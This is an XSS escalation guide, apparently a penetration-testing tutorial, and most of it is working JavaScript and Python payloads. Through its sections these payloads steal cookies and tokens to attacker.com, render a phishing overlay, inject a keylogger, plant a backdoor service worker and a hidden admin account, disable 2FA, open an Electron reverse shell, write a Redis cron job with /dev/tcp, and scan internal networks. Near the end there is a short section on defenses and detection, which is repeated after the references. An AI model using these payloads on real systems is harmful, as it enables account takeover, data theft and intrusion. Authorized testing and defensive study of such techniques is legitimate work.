# XSS to RCE Escalation Guide

> Techniques for escalating Cross-Site Scripting from simple alert boxes to full account takeover, persistent backdoors via Service Workers, and Remote Code Execution through chained vulnerabilities.

## Introduction

A common mistake in security testing is treating XSS as a low-severity "alert box" vulnerability. In reality, XSS is a powerful entry point that can be escalated to full account takeover, persistent backdoor installation, internal network pivoting, and even Remote Code Execution (RCE) on server infrastructure. The impact of XSS depends on the application's architecture, the victim's privilege level, and the attacker's creativity in chaining vulnerabilities.

This guide covers the complete escalation chain from initial XSS to maximum impact. Each section builds on the previous one, demonstrating how a simple reflected XSS can be chained into a catastrophic compromise. The techniques are organized by escalation path: session hijacking, persistent backdoors, server-side chaining, and desktop application exploitation.

**Ethical Note**: These techniques should only be used in authorized penetration tests with proper scope and rules of engagement. Always demonstrate impact proportionally and never cause actual harm during testing.

## 1. Session Hijacking and Account Takeover

The most direct escalation path: steal session tokens and impersonate the victim. This is the most common XSS impact seen in real-world attacks and should always be demonstrated during penetration testing.

### Cookie-Based Session Hijacking

When session tokens are stored in cookies without the `HttpOnly` flag, JavaScript can read them directly via `document.cookie`.

```javascript
// Exfiltrate cookies (when HttpOnly is not set)
<script>
fetch('https://attacker.com/steal?c=' + encodeURIComponent(document.cookie));
</script>
```

**Important**: Modern applications often set `HttpOnly` on session cookies, preventing direct JavaScript access. In this case, pivot to alternative token storage mechanisms.

### Token Exfiltration from Web Storage

Many modern SPAs store JWTs and access tokens in `localStorage` or `sessionStorage` instead of cookies. These are always accessible to JavaScript.

```javascript
// Steal tokens from localStorage/sessionStorage
<script>
const tokens = {
  access: localStorage.getItem('access_token'),
  refresh: localStorage.getItem('refresh_token'),
  session: sessionStorage.getItem('session_id'),
  // Enumerate all localStorage keys
  allKeys: Object.keys(localStorage).reduce((acc, key) => {
    acc[key] = localStorage.getItem(key);
    return acc;
  }, {})
};
navigator.sendBeacon('https://attacker.com/collect', JSON.stringify(tokens));
</script>
```

### Credential Harvesting via Phishing Overlay

When session tokens are not directly accessible, use the XSS to render a convincing fake login form that captures credentials. This technique is particularly effective because the form appears on the legitimate domain, making it extremely convincing.

```javascript
// Capture credentials via fake login overlay
<script>
document.body.innerHTML = `
  <div style="position:fixed;top:0;left:0;width:100%;height:100%;
              background:#fff;z-index:99999;display:flex;
              align-items:center;justify-content:center;">
    <form action="https://attacker.com/phish" method="POST">
      <h2>Session Expired - Please Re-authenticate</h2>
      <input name="email" type="email" placeholder="Email"><br>
      <input name="password" type="password" placeholder="Password"><br>
      <button type="submit">Login</button>
    </form>
  </div>`;
</script>
```

### Keylogger Injection

For applications where session tokens rotate frequently, a keylogger provides persistent access by capturing credentials as the victim types them.

```javascript
// Inject a keylogger that exfiltrates keystrokes
<script>
const keys = [];
document.addEventListener('keypress', function(e) {
  keys.push(e.key);
  if (keys.length >= 20) {
    navigator.sendBeacon('https://attacker.com/keys', JSON.stringify(keys));
    keys.length = 0;
  }
});
// Also capture form submissions
document.querySelectorAll('form').forEach(form => {
  form.addEventListener('submit', function(e) {
    const data = new FormData(form);
    navigator.sendBeacon('https://attacker.com/form',
      JSON.stringify(Object.fromEntries(data)));
  });
});
</script>
```

### Session Hijacking Decision Matrix

| Scenario | Token Location | `HttpOnly` | Best Attack Vector |
|----------|---------------|------------|-------------------|
| Traditional web app | Cookie | No | `document.cookie` exfiltration |
| Traditional web app | Cookie | Yes | CSRF + XSS combo or phishing overlay |
| SPA with JWT | localStorage | N/A | `localStorage.getItem()` exfiltration |
| SPA with Bearer token | sessionStorage | N/A | `sessionStorage.getItem()` exfiltration |
| High-security app | HttpOnly cookie + short TTL | Yes | Keylogger for credential capture |

## 2. Service Worker Persistence

Register a malicious Service Worker to maintain persistent access even after the XSS is patched.

```javascript
// Step 1: Host malicious service worker on same origin
// Requires finding an upload endpoint or path traversal
// sw.js content (hosted at /uploads/sw.js):
self.addEventListener('fetch', function(event) {
  // Intercept all requests
  if (event.request.url.includes('/api/')) {
    // Clone and exfiltrate API responses
    event.respondWith(
      fetch(event.request).then(function(response) {
        const clone = response.clone();
        clone.text().then(function(body) {
          fetch('https://attacker.com/exfil', {
            method: 'POST',
            body: JSON.stringify({
              url: event.request.url,
              data: body
            })
          });
        });
        return response;
      })
    );
  }
});

// Step 2: Register via XSS payload
<script>
if ('serviceWorker' in navigator) {
  navigator.serviceWorker.register('/uploads/sw.js', {
    scope: '/'
  }).then(function(reg) {
    console.log('Persistent backdoor installed');
  });
}
</script>
```

## 3. CSRF to Admin Actions

Use XSS to perform privileged actions as the victim without needing their credentials.

```javascript
// Create admin account via XSS
<script>
fetch('/admin/users/create', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'X-CSRF-Token': document.querySelector('meta[name=csrf-token]').content
  },
  credentials: 'include',
  body: JSON.stringify({
    username: 'backdoor_admin',
    password: 'P@ssw0rd123!',
    role: 'administrator',
    email: 'attacker@evil.com'
  })
});
</script>

// Modify application settings (disable security features)
<script>
fetch('/api/settings', {
  method: 'PUT',
  headers: {'Content-Type': 'application/json'},
  credentials: 'include',
  body: JSON.stringify({
    two_factor_auth: false,
    ip_whitelist: [],
    session_timeout: 999999,
    allow_api_key_creation: true
  })
});
</script>
```

## 4. XSS to RCE via Electron Apps

Desktop applications built with Electron often have Node.js integration enabled. When an Electron application loads web content (e.g., via `<webview>` or loading external URLs), XSS can be escalated to full native code execution on the victim's machine.

### Direct Node.js Access (nodeIntegration enabled)

This is the most dangerous configuration. If `nodeIntegration: true` is set in the BrowserWindow configuration, JavaScript in the renderer process has full access to Node.js APIs including `require()`, `child_process`, and `fs`.

```javascript
// If nodeIntegration is enabled (common in older Electron apps)
<script>
const { exec } = require('child_process');
exec('id && cat /etc/passwd', function(err, stdout) {
  fetch('https://attacker.com/rce', {
    method: 'POST',
    body: stdout
  });
});
</script>
```

### Preload Script Abuse (contextIsolation disabled)

Even with `nodeIntegration: false`, if `contextIsolation: false`, the renderer's JavaScript can access properties exposed by the preload script via `window`.

```javascript
// If contextIsolation is disabled, access via preload bridge
<script>
// Access exposed Node APIs through window object
if (window.electronAPI) {
  window.electronAPI.executeCommand('whoami');
}
// Or exploit prototype pollution to escape sandbox
// Bypass via __proto__ pollution:
Object.prototype.getCommand = function() { return 'id'; };
</script>
```

### Reverse Shell via Electron

The ultimate escalation: establish a persistent reverse shell on the victim's machine through the Electron application.

```javascript
// Reverse shell via Electron XSS
<script>
const net = require('net');
const { spawn } = require('child_process');
const client = new net.Socket();
client.connect(4444, 'attacker.com', function() {
  const sh = spawn('/bin/bash', []);
  client.pipe(sh.stdin);
  sh.stdout.pipe(client);
  sh.stderr.pipe(client);
});
</script>
```

### Electron Security Configuration Audit

Before exploiting, check the application's security posture by testing for these common misconfigurations:

| Configuration | Secure Value | Exploitable If |
|--------------|-------------|----------------|
| `nodeIntegration` | `false` | Set to `true` |
| `contextIsolation` | `true` | Set to `false` |
| `enableRemoteModule` | `false` | Set to `true` |
| `sandbox` | `true` | Set to `false` |
| `webSecurity` | `true` | Set to `false` |
| `allowRunningInsecureContent` | `false` | Set to `true` |

## 5. OAuth Token Theft and API Abuse

```javascript
// Steal OAuth tokens and use them for API access
<script>
// Extract token from URL fragment (implicit flow)
const hash = new URLSearchParams(window.location.hash.substring(1));
const accessToken = hash.get('access_token');

// Or intercept OAuth callback
const originalAssign = location.assign;
location.assign = function(url) {
  if (url.includes('access_token') || url.includes('code=')) {
    fetch('https://attacker.com/oauth-steal?url=' + encodeURIComponent(url));
  }
  return originalAssign.call(this, url);
};

// Use stolen token to access APIs
fetch('https://api.target.com/v1/users/me', {
  headers: {'Authorization': 'Bearer ' + accessToken}
}).then(r => r.json()).then(data => {
  fetch('https://attacker.com/data', {
    method: 'POST',
    body: JSON.stringify(data)
  });
});
</script>
```

## 6. WebSocket Hijacking

```javascript
// Intercept and inject into WebSocket connections
<script>
const OrigWebSocket = window.WebSocket;
window.WebSocket = function(url, protocols) {
  const ws = new OrigWebSocket(url, protocols);

  ws.addEventListener('message', function(event) {
    // Exfiltrate all messages
    fetch('https://attacker.com/ws-data', {
      method: 'POST',
      body: event.data
    });
  });

  // Inject malicious commands after connection
  const origSend = ws.send.bind(ws);
  ws.send = function(data) {
    // Inject admin commands
    origSend(JSON.stringify({
      action: 'elevate_privileges',
      target_user: 'attacker@evil.com',
      role: 'admin'
    }));
    return origSend(data);
  };

  return ws;
};
</script>
```

## 7. Chaining XSS with Server-Side Vulnerabilities

```bash
# Step 1: Use XSS to discover internal endpoints
# Payload that scans internal network from victim's browser:
<script>
const internalHosts = ['10.0.0.1', '192.168.1.1', '172.16.0.1'];
const ports = [80, 443, 8080, 8443, 9200, 6379, 27017];

internalHosts.forEach(host => {
  ports.forEach(port => {
    fetch(`http://${host}:${port}/`).then(r => r.text()).then(body => {
      fetch('https://attacker.com/internal-scan', {
        method: 'POST',
        body: JSON.stringify({host, port, body: body.substring(0, 500)})
      });
    }).catch(() => {});
  });
});
</script>
```

```python
# Step 2: Use discovered SSRF endpoint via XSS
# If admin panel has an SSRF-vulnerable feature:
import requests

# Use stolen admin session to trigger SSRF -> RCE
session = requests.Session()
session.cookies.set('session', 'stolen_admin_session_token')

# Exploit internal service (e.g., Redis) via SSRF
payload = "http://internal-redis:6379/\r\nSET shell '*/1 * * * * bash -i >& /dev/tcp/attacker.com/4444 0>&1'\r\nCONFIG SET dir /var/spool/cron/\r\nCONFIG SET dbfilename root\r\nSAVE\r\n"

session.post('https://target.com/admin/fetch-url', data={'url': payload})
```

## 8. Detection and Prevention

Understanding how defenders detect and prevent XSS-to-RCE chains is essential for both offensive and defensive security work.

```bash
# Monitor for Service Worker registrations
# CSP header to restrict Service Worker scope:
Content-Security-Policy: worker-src 'self';

# Detect XSS-to-ATO attempts in server logs:
grep -E "(serviceWorker\.register|navigator\.sendBeacon|fetch.*attacker)" \
  /var/log/nginx/access.log

# Implement Subresource Integrity for critical scripts:
<script src="/js/app.js"
  integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8w"
  crossorigin="anonymous"></script>
```

### Defense-in-Depth Matrix

| Escalation Path | Primary Defense | Secondary Defense |
|----------------|-----------------|-------------------|
| Cookie theft | `HttpOnly` + `Secure` + `SameSite` | Token binding, IP pinning |
| Token exfiltration | Short-lived tokens, rotation | Device fingerprinting |
| Service Worker backdoor | CSP `worker-src 'self'` | SW scope restrictions, registration monitoring |
| CSRF via XSS | CSRF tokens on all state-changing requests | SameSite cookies, re-authentication |
| Electron RCE | `contextIsolation: true`, `nodeIntegration: false` | Sandbox, IPC validation |
| Internal scanning | Network segmentation, egress filtering | Internal service authentication |
| WebSocket hijacking | Origin validation on WS connections | Message signing, rate limiting |

## Hands-on Exercises

### Exercise 1: Full Account Takeover Chain

**Objective**: Starting from a reflected XSS vulnerability, demonstrate a complete account takeover of an admin user.

**Setup**: Deploy a local DVWA or Juice Shop instance with a known XSS vulnerability.

1. Identify a reflected XSS entry point (e.g., search parameter)
2. Craft a payload that steals the session cookie: `fetch('https://callback/?c='+document.cookie)`
3. Set up a callback server using `python -m http.server` or `ngrok`
4. If `HttpOnly` is set on cookies, pivot to stealing tokens from `localStorage` instead
5. Use the stolen credentials to authenticate as the victim user
6. Document the complete attack chain including the social engineering delivery mechanism

### Exercise 2: Service Worker Persistence Lab

**Objective**: Install a persistent backdoor via a malicious Service Worker that survives XSS remediation.

1. Find a file upload endpoint or path traversal that allows hosting a JavaScript file on the same origin
2. Write a Service Worker that intercepts API requests and exfiltrates response data
3. Register the Service Worker via your XSS payload using `navigator.serviceWorker.register()`
4. Verify that the Service Worker remains active after the XSS vulnerability is patched
5. Test defensive measures: set CSP `worker-src 'self'` and verify the attack is blocked

### Exercise 3: XSS to Internal Network Pivot

**Objective**: Use XSS in a victim's browser to scan and exploit internal network services.

1. Craft a JavaScript payload that probes internal IP ranges (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16)
2. Test common internal service ports: 80, 443, 8080, 8443, 9200, 6379, 27017, 3306
3. When an internal service is found, attempt to extract data via fetch() requests
4. If an internal admin panel is discovered, use the victim's session to perform admin actions
5. Document the internal network topology discovered through the browser pivot

## References

- **PortSwigger XSS to RCE Research**: https://portswigger.net/research -- Research papers on advanced XSS exploitation techniques.
- **Electron Security Checklist**: https://www.electronjs.org/docs/latest/tutorial/security -- Official Electron security best practices for understanding attack surfaces.
- **Service Worker Security**: https://w3c.github.io/ServiceWorker/ -- W3C specification including security considerations for Service Workers.
- **OWASP Session Management Cheat Sheet**: https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html -- Defense guidance for session hijacking prevention.
- **Mario Heiderich - XSS Therapy**: https://www.youtube.com/watch?v=H9aj2vhYDxs -- Conference talk on advanced XSS exploitation and defense.
- **LiveOverflow XSS Series**: https://www.youtube.com/playlist?list=PLhixgUqwRTjxOYk5aoqYqaY8bOoFuvYdX -- Video series covering XSS from basics to advanced exploitation.
- **HackerOne Hacktivity**: https://hackerone.com/hacktivity -- Real-world XSS escalation case studies from bug bounty reports.
- **OWASP Testing Guide - Client-Side Testing**: https://owasp.org/www-project-web-security-testing-guide/ -- Comprehensive testing methodology for client-side vulnerabilities.

```bash
# Monitor for Service Worker registrations
# CSP header to restrict Service Worker scope:
Content-Security-Policy: worker-src 'self';

# Detect XSS-to-ATO attempts in server logs:
grep -E "(serviceWorker\.register|navigator\.sendBeacon|fetch.*attacker)" \
  /var/log/nginx/access.log

# Implement Subresource Integrity for critical scripts:
<script src="/js/app.js"
  integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8w"
  crossorigin="anonymous"></script>
```
